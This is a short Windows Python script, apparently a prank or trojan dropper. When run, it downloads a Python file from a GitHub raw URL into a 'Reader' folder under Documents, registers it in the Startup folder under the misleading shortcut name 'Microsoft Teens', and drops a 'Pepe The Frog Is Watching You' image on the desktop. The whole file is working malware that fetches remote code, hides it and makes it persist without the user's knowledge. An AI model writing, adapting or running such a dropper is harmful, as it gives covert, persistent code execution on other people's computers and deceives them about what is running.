import os
import requests
import sys
import winshell

def create_desktop_shortcut(target_path, shortcut_name):
    # Get the path to the desktop folder
    desktop = winshell.desktop()
    shortcut_path = os.path.join(desktop, f"{shortcut_name}.lnk")

    winshell.CreateShortcut(
        Path= shortcut_path,
        Target = target_path,
        Icon=(target_path, 0)
    )

def create_startup_shortcut(target_path, shortcut_name):
    startup = winshell.startup() #"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\\" 
    print(startup)
    shortcut_path = os.path.join(startup, f"{shortcut_name}.lnk")

    winshell.CreateShortcut(
        Path= shortcut_path,
        Target = target_path,
        Icon=(target_path, 0)
    )

def download_raw_content(raw_link, filepath = None):
    
    response = requests.get(raw_link)
    if filepath == None: print("Need to enter filepath aswell.")
    
    with open(filepath, "wb") as f:
        f.write(response.content)


def file_check_create(filepath = None, content = None):
    
    if os.path.exists(filepath):
        print(f"file: '{filepath}' already exists.")


    elif filepath == None:
        return

    else:
        with open(filepath, "wb") as f:
            f.write(content)


def dir_check_create(filepath = None):
    if not(os.path.exists(filepath)):
        os.makedirs(filepath)
    
    else:
        print(f"dir: '{filepath}' already exists")
        


def run_on_startup():
    documents = os.path.normpath(os.path.expanduser("~/Documents"))
    file_path = f"{documents}/Reader/Reader.py"
    shortcut_name = "Microsoft Teens"
    #create_startup_shortcut(file_path, "Microsoft Teens")
    create_startup_shortcut(file_path, shortcut_name)

def hide_program():
    response = requests.get("https://raw.githubusercontent.com/Dominik-Gryko/Friendly-Experiment/main/main.py")
    documents = os.path.normpath(os.path.expanduser("~/Documents"))
    directory_path = f"{documents}/Reader"
    file_path = f"{documents}/Reader/Reader.py"

    dir_check_create(directory_path)
    file_check_create(file_path, response.content)






def main():
    hide_program()
    run_on_startup()
    
    desktop = os.path.normpath(os.path.expanduser("~/Desktop"))
    download_raw_content("https://i.imgur.com/8nLFCVP.png", f"{desktop}/Pepe The Frog Is Watching You.png")

main()
